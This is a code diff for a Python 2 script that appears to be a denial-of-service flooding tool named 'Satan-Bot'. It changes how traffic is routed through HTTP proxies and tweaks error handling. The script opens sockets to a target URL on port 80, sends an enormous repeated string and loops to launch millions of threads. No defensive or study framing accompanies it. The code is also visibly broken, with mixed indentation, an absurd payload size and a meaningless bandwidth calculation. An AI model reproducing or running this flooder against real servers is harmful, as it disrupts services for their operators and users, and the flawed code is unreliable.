@@ -85,9 +85,7 @@ def httpcall(url):
 	code=0
         nbytes = 13743895347200
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        socks.set_default_proxy(socks.PROXY_TYPE_HTTP, prox, 80)
-        socket.socket = socks.socksocket
-	bytes = random._urandom(0)
+        socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, prox, 80)
         start = time.time()
 	current = time.time() - start
 	bps = (nbytes*8)/current
@@ -95,8 +93,8 @@ def httpcall(url):
 	try:
 			s.connect((url,80))
 			s.send("Satan-Bot" * 109951162777600)			
-	except socket.error:						
-			print "b/ps: %d" % bps
+	except socket.error as e:						
+			print "b/ps: %s" % bps
 
 	
 #http caller thread 
@@ -121,6 +119,7 @@ else:
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
+				
 		url = sys.argv[1]
 		
 		for i in range(6666666):
